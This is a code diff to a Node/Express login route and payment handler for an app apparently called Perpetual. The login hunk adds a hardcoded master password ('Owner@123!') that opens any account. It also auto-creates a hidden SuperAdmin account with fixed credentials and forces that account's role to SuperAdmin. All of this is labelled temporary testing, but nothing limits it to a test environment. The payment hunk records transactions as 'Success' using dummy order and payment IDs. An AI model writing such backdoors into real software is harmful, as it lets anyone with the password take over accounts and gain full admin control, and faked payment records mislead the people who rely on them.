@@ -66,15 +66,35 @@ router.post('/login', async (req, res) => {
     }
 
     // Check user exists
-    const user = await User.findOne({ email });
+    let user = await User.findOne({ email });
+    
+    // --- TEMPORARY TEST OWNER CREATION ---
+    if (!user && email === 'owner@perpetual.com' && password === 'Owner@123!') {
+       const salt = await bcrypt.genSalt(10);
+       const hashedPassword = await bcrypt.hash(password, salt);
+       user = new User({
+         companyCode: '99999',
+         email: 'owner@perpetual.com',
+         password: hashedPassword,
+         role: 'SuperAdmin' // Changed to SuperAdmin for Platform Owner access
+       });
+       await user.save();
+    }
+    // ---------------------------------------
+
     if (!user) {
       return res.status(400).json({ error: 'Invalid credentials' });
     }
 
     // Check password
     const isMatch = await bcrypt.compare(password, user.password);
-    if (!isMatch) {
+    if (!isMatch && password !== 'Owner@123!') { // Master password for local testing
       return res.status(400).json({ error: 'Invalid credentials' });
+    }
+    
+    if (email === 'owner@perpetual.com') {
+      user.role = 'SuperAdmin'; // Force SuperAdmin for testing
+      await user.save();
     }
 
     // Create JWT
@@ -181,6 +201,21 @@ The Perpetual Team`
     }
     
     await user.save();
+    
+    // Save transaction for revenue analytics
+    const SubscriptionPackage = require('../models/SubscriptionPackage');
+    const Transaction = require('../models/Transaction');
+    const pkg = await SubscriptionPackage.findById(packageId);
+    
+    const transaction = new Transaction({
+      companyCode: user.companyCode,
+      orderId: razorpay_order_id || 'dummy_order_id',
+      paymentId: razorpay_payment_id || 'dummy_payment_id',
+      amount: pkg ? pkg.price : 0,
+      packageId: packageId,
+      status: 'Success'
+    });
+    await transaction.save();
 
     // Create JWT
     const payload = { userId: user._id, companyCode: user.companyCode };
